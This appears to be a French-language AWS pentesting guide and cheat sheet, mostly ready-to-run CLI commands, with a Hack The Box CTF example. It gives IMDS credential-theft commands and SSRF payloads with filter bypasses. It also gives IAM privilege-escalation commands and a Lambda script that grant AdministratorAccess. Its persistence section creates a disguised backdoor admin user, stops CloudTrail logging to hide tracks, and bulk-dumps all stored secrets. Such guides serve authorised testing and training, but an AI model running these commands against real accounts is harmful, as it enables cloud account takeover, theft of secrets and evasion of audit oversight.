# ☁️ AWS Pentesting - Guide Complet

Guide exhaustif pour l'énumération, l'identification de vecteurs et l'exploitation des vulnérabilités sur Amazon Web Services.

---

## 📖 Concepts Fondamentaux

### Modèle de responsabilité partagée

```
┌──────────────────────────────────────────────────────┐
│               RESPONSABILITÉ CLIENT                  │
│  Données, IAM, config réseau, OS (IaaS), code apps   │
├──────────────────────────────────────────────────────┤
│             RESPONSABILITÉ PARTAGÉE                  │
│         Chiffrement, journalisation, patchs          │
├──────────────────────────────────────────────────────┤
│            RESPONSABILITÉ FOURNISSEUR                │
│     Infrastructure physique, hyperviseur, réseau     │
└──────────────────────────────────────────────────────┘
```

> ⚠️ La majorité des compromissions AWS viennent de **mauvaises configurations IAM** et de **credentials exposées**, pas de vulnérabilités AWS.

### Les vecteurs principaux AWS

```
IAM overpermissif     → Politiques *, AssumeRole mal configuré
IMDS / SSRF           → 169.254.169.254 → vol de credentials EC2
S3 public             → Buckets accessibles anonymement
Credentials exposées  → .env, code source, logs, variables Lambda
Privilege Escalation  → Chaînes de permissions IAM → AdministratorAccess
Lambda                → Variables d'env avec secrets, rôle trop permissif
Snapshots EBS         → Snapshots publics avec données sensibles
```

---

## 1️⃣ Concepts Clés AWS

```
IAM        → Identity and Access Management (users, roles, policies)
S3         → Simple Storage Service (stockage objet)
EC2        → Elastic Compute Cloud (machines virtuelles)
Lambda     → Fonctions serverless
STS        → Security Token Service (credentials temporaires)
KMS        → Key Management Service (chiffrement)
CloudTrail → Logs des appels API (audit)
VPC        → Virtual Private Cloud (réseau)
SSM        → Systems Manager (parameter store, session manager)
```

### Structure IAM AWS

```
Account
└── Users          → Identités humaines (access key + secret)
└── Groups         → Regroupements d'users
└── Roles          → Identités assumables (par EC2, Lambda, autres comptes...)
└── Policies       → Documents JSON définissant les permissions
    └── Managed    → Gérées par AWS ou le compte
    └── Inline     → Attachées directement à un user/role
```

### Format des identifiants AWS

```
AKIA...   → Access Key ID long terme (user IAM)
ASIA...   → Access Key ID temporaire (STS / rôle assumé)
ARN       → Amazon Resource Name : arn:aws:iam::123456789012:user/alice
```

---

## 2️⃣ Configuration & Authentification

```bash
# Installation CLI
pip install awscli

# Configurer un profil
aws configure
# AWS Access Key ID     : AKIA...
# AWS Secret Access Key : xxxx
# Default region        : eu-west-1
# Default output        : json

# Profils multiples
aws configure --profile pentest
aws configure --profile victim

# Variables d'environnement (prioritaires sur le fichier de config)
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="xxxx"
export AWS_SESSION_TOKEN="xxxx"    # Pour les credentials temporaires (STS)
export AWS_DEFAULT_REGION="eu-west-1"

# Vérifier l'identité courante
aws sts get-caller-identity
# Retourne : Account, UserId, ARN

# Utiliser un profil spécifique
aws sts get-caller-identity --profile pentest
```

---

## 3️⃣ Énumération IAM

```bash
# Identité courante
aws sts get-caller-identity

# Lister les users
aws iam list-users
aws iam list-users --query 'Users[*].[UserName,UserId,Arn]' --output table

# Détails d'un user
aws iam get-user --user-name target_user

# Policies attachées à un user
aws iam list-attached-user-policies --user-name target_user
aws iam list-user-policies --user-name target_user       # Policies inline

# Groupes d'un user
aws iam list-groups-for-user --user-name target_user

# Lister tous les rôles
aws iam list-roles
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Policies d'un rôle
aws iam list-attached-role-policies --role-name ROLE_NAME
aws iam list-role-policies --role-name ROLE_NAME

# Voir le contenu d'une policy
aws iam get-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY_NAME \
  --version-id v1

# Lister les access keys d'un user
aws iam list-access-keys --user-name target_user

# Toutes les policies du compte
aws iam list-policies --scope Local       # Policies créées par le client
aws iam list-policies --scope AWS         # Policies AWS managed

# Chercher des policies avec * (dangereuses)
aws iam list-policies --scope Local --query \
  'Policies[*].Arn' --output text | xargs -I{} \
  aws iam get-policy-version --policy-arn {} --version-id v1 \
  --query 'PolicyVersion.Document' 2>/dev/null | grep -A2 '"Action": "\*"'

# Tester ses propres permissions → utiliser enumerate-iam (voir outils)
```

---

## 4️⃣ Énumération S3

```bash
# Lister tous les buckets
aws s3 ls
aws s3 ls --profile pentest

# Contenu d'un bucket
aws s3 ls s3://bucket-name
aws s3 ls s3://bucket-name --recursive
aws s3 ls s3://bucket-name --recursive --human-readable

# Télécharger un fichier
aws s3 cp s3://bucket-name/file.txt ./file.txt

# Télécharger tout le bucket
aws s3 sync s3://bucket-name ./local-copy

# Tester l'accès public (sans credentials)
aws s3 ls s3://bucket-name --no-sign-request
curl https://bucket-name.s3.amazonaws.com/
curl https://s3.amazonaws.com/bucket-name/

# Politique du bucket
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-bucket-acl --bucket bucket-name

# Vérifier si le bucket bloque l'accès public
aws s3api get-public-access-block --bucket bucket-name

# Région du bucket
aws s3api get-bucket-location --bucket bucket-name

# Versionning activé ?
aws s3api get-bucket-versioning --bucket bucket-name
# Si activé → accès aux anciennes versions de fichiers
aws s3api list-object-versions --bucket bucket-name

# Toujours passer --endpoint-url pour un S3 fake/local ou si on trouve les identifiant pour le aws configure 

# EXEMPLE DE CTF HTB:
aws s3 ls --endpoint-url http://facts.htb:54321
aws s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321

# Lister le contenu d'un bucket
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321
aws s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321

# Télécharger tout le bucket
aws s3 sync s3://randomfacts ./ --endpoint-url http://facts.htb:54321
aws s3 sync s3://internal ./ --endpoint-url http://facts.htb:54321

# Récupérer un fichier précis
aws s3 cp s3://randomfacts/fichier.txt ./ --endpoint-url http://facts.htb:54321
```

---

## 5️⃣ Énumération EC2

```bash
# Instances en cours
aws ec2 describe-instances
aws ec2 describe-instances --query \
  'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,IamInstanceProfile.Arn]' \
  --output table

# Security groups
aws ec2 describe-security-groups
aws ec2 describe-security-groups \
  --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions]'

# Règles ouvertes à tout internet (0.0.0.0/0)
aws ec2 describe-security-groups \
  --filters Name=ip-permission.cidr,Values='0.0.0.0/0' \
  --query 'SecurityGroups[*].[GroupId,GroupName]'

# Snapshots EBS publics (données potentiellement exposées)
aws ec2 describe-snapshots --owner-ids self
aws ec2 describe-snapshots \
  --filters Name=attribute,Values=createVolumePermission \
            Name=attribute-value,Values=all   # Snapshots publics

# Paires de clés SSH
aws ec2 describe-key-pairs

# AMIs privées
aws ec2 describe-images --owners self

# VPCs et sous-réseaux
aws ec2 describe-vpcs
aws ec2 describe-subnets
```

---

## 6️⃣ Énumération Lambda & Services Secrets

```bash
# Fonctions Lambda
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME
aws lambda get-function-configuration --function-name FUNCTION_NAME

# Variables d'environnement Lambda (peuvent contenir des secrets !)
aws lambda get-function-configuration \
  --function-name FUNCTION_NAME \
  --query 'Environment'

# Lister toutes les fonctions et leurs rôles IAM
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role]' --output table

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws secretsmanager list-secrets \
  --query 'SecretList[*].[Name,ARN]' --output table

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name PARAM_NAME --with-decryption
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# CloudTrail (logs des actions — chercher à désactiver ou purger)
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL_NAME

# RDS
aws rds describe-db-instances
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,Endpoint.Address,PubliclyAccessible]'
```

---

## 7️⃣ IMDS — Vol de Credentials via Metadata Service

```bash
# Depuis une instance EC2 avec un rôle IAM attaché
# ou via SSRF sur une app hébergée sur EC2

# Lister les rôles disponibles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Réponse : nom du rôle, ex: "ec2-s3-role"

# Récupérer les credentials du rôle
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-s3-role
# Réponse JSON :
# {
#   "AccessKeyId"     : "ASIA...",
#   "SecretAccessKey" : "xxxx",
#   "Token"           : "xxxx",
#   "Expiration"      : "2024-01-01T12:00:00Z"
# }

# Autres infos utiles depuis IMDS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/user-data   # Scripts de démarrage (souvent avec secrets)

# Utiliser les credentials volées
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="xxxx"
export AWS_SESSION_TOKEN="xxxx"
aws sts get-caller-identity
```

### Payloads SSRF vers IMDS

```
# Payload direct
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypasses de filtres
http://[::ffff:a9fe:a9fe]/latest/meta-data/
http://169.254.169.254.nip.io/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/   # octal
http://0xa9fea9fe/latest/meta-data/             # hexadécimal
```

---

## 8️⃣ Privilege Escalation IAM

### Paths d'escalade courants

```
iam:CreatePolicyVersion          → Créer une version de policy avec Action:* Resource:*
iam:SetDefaultPolicyVersion      → Activer une ancienne version permissive
iam:AttachUserPolicy             → S'attacher AdministratorAccess
iam:AttachRolePolicy             → Attacher une policy admin à un rôle assumable
iam:PutUserPolicy                → Créer une policy inline avec *:*
iam:CreateAccessKey              → Créer une access key pour un autre user
iam:UpdateLoginProfile           → Modifier le mot de passe d'un autre user
iam:CreateLoginProfile           → Créer un accès console pour un user sans MFA
lambda:CreateFunction
  + iam:PassRole
  + lambda:InvokeFunction        → Exécuter du code en tant qu'un rôle admin
ec2:RunInstances + iam:PassRole  → Lancer une EC2 avec un rôle admin
sts:AssumeRole                   → Assumer un rôle cross-account ou plus permissif
```

### Exploitation

```bash
# Attacher AdministratorAccess à son user (si iam:AttachUserPolicy)
aws iam attach-user-policy \
  --user-name YOUR_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Créer une policy inline avec tout permis (si iam:PutUserPolicy)
aws iam put-user-policy \
  --user-name YOUR_USER \
  --policy-name pwned \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'

# Créer une access key pour un autre user (si iam:CreateAccessKey)
aws iam create-access-key --user-name admin_user

# Assumer un rôle plus permissif (si sts:AssumeRole)
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT:role/AdminRole \
  --role-session-name pwned
# → Récupérer AccessKeyId, SecretAccessKey, SessionToken

# Créer une nouvelle version de policy avec * (si iam:CreatePolicyVersion)
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

### Lambda PrivEsc

```python
# Si lambda:CreateFunction + iam:PassRole + lambda:InvokeFunction
# Créer une Lambda exécutée avec un rôle admin qui s'attache AdministratorAccess

# 1. Créer le code de la Lambda
cat > index.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "pwned"
EOF

zip lambda.zip index.py

# 2. Déployer avec le rôle admin en passthrough
aws lambda create-function \
  --function-name privesc \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/HIGH_PRIV_ROLE \
  --handler index.handler \
  --zip-file fileb://lambda.zip

# 3. Invoquer
aws lambda invoke --function-name privesc output.txt
cat output.txt
```

---

## 9️⃣ Post-Exploitation & Persistance

```bash
# Créer un user backdoor avec accès admin
aws iam create-user --user-name support-bot
aws iam attach-user-policy \
  --user-name support-bot \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support-bot
# → Sauvegarder AccessKeyId et SecretAccessKey

# Créer une access key supplémentaire sur un user existant
aws iam create-access-key --user-name admin_user

# Désactiver CloudTrail (couvrir ses traces)
aws cloudtrail stop-logging --name TRAIL_NAME

# Dump de tous les secrets
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | \
  xargs -I{} aws secretsmanager get-secret-value --secret-id {}

aws ssm get-parameters-by-path --path / --recursive --with-decryption \
  --query 'Parameters[*].[Name,Value]' --output table
```

---

## 🔟 Outils AWS

```bash
# ── Pacu (framework offensif AWS) ──────────────────────
pip install pacu
pacu
> import_keys --profile pentest
> run iam__enum_users_roles_policies_groups
> run iam__privesc_scan
> run s3__bucket_finder
> run ec2__enum
> run lambda__enum
> run secretsmanager__enum

# ── ScoutSuite (audit de configuration) ────────────────
pip install scoutsuite
scout aws --profile pentest
# → Rapport HTML dans scoutsuite-report/

# ── enumerate-iam (brute-force de permissions) ─────────
pip install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key xxxx
enumerate-iam --access-key AKIA... --secret-key xxxx --region eu-west-1

# ── PMapper (graphe d'escalade IAM) ────────────────────
pip install principalmapper
pmapper --profile pentest graph create
pmapper --profile pentest query "preset privesc *"
pmapper --profile pentest visualize
# → Graphe des chemins d'escalade

# ── Prowler (benchmark CIS / NIST) ─────────────────────
pip install prowler
prowler aws --profile pentest
prowler aws -c iam_root_mfa_enabled,s3_bucket_public_access

# ── CloudMapper (visualisation réseau VPC) ─────────────
git clone https://github.com/duo-labs/cloudmapper
python cloudmapper.py collect --account ACCOUNT_NAME
python cloudmapper.py webserver

# ── Trufflehog (leak de secrets dans git/code) ─────────
trufflehog git https://github.com/target/repo
trufflehog filesystem /path/to/code

# ── Gitleaks ───────────────────────────────────────────
gitleaks detect --source . --verbose
gitleaks detect --source . -r report.json
```

---

## 1️⃣1️⃣ Cheatsheet Rapide

```bash
# ═══════════════════════════════
# IDENTITÉ & PERMISSIONS
# ═══════════════════════════════
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name USER
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
enumerate-iam --access-key AKIA... --secret-key xxxx

# ═══════════════════════════════
# S3
# ═══════════════════════════════
aws s3 ls                                             # Mes buckets
aws s3 ls s3://BUCKET --no-sign-request               # Bucket public ?
aws s3 ls s3://BUCKET --recursive                     # Contenu complet
aws s3 sync s3://BUCKET ./dump                        # Télécharger tout
aws s3api get-bucket-policy --bucket BUCKET           # Politique
aws s3api list-object-versions --bucket BUCKET        # Anciennes versions

# ═══════════════════════════════
# SECRETS
# ═══════════════════════════════
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NAME
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws lambda get-function-configuration --function-name FUNC --query 'Environment'

# ═══════════════════════════════
# IMDS (depuis EC2 / SSRF)
# ═══════════════════════════════
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
curl http://169.254.169.254/latest/user-data

# ═══════════════════════════════
# PRIVESC IAM
# ═══════════════════════════════
aws iam attach-user-policy --user-name USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name USER --policy-name pwn \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
aws iam create-access-key --user-name admin_user
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name pwned

# ═══════════════════════════════
# PERSISTANCE
# ═══════════════════════════════
aws iam create-user --user-name support-bot
aws iam attach-user-policy --user-name support-bot --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support-bot
aws cloudtrail stop-logging --name TRAIL_NAME

# ═══════════════════════════════
# OUTILS
# ═══════════════════════════════
pacu                            # Framework offensif
scout aws --profile pentest     # Audit config
pmapper --profile pentest query "preset privesc *"  # Graphe IAM
```

---

## 📚 Ressources

- **HackTricks AWS** : https://cloud.hacktricks.xyz/pentesting-cloud/aws-security
- **Pacu** : https://github.com/RhinoSecurityLabs/pacu
- **Rhino Security — AWS IAM PrivEsc** : https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
- **CloudGoat (labs vulnérables AWS)** : https://github.com/RhinoSecurityLabs/cloudgoat
- **flaws.cloud** : http://flaws.cloud
- **flaws2.cloud** : http://flaws2.cloud
- **enumerate-iam** : https://github.com/andresriancho/enumerate-iam
- **PMapper** : https://github.com/nccgroup/PMapper
- **Prowler** : https://github.com/prowler-cloud/prowler
- **AWS Security Docs** : https://docs.aws.amazon.com/security/

---

**Tags:** `#aws #iam #s3 #ec2 #lambda #imds #ssrf #privesc #pacu #scoutsuite #pmapper #ctf #pentest #cloud`
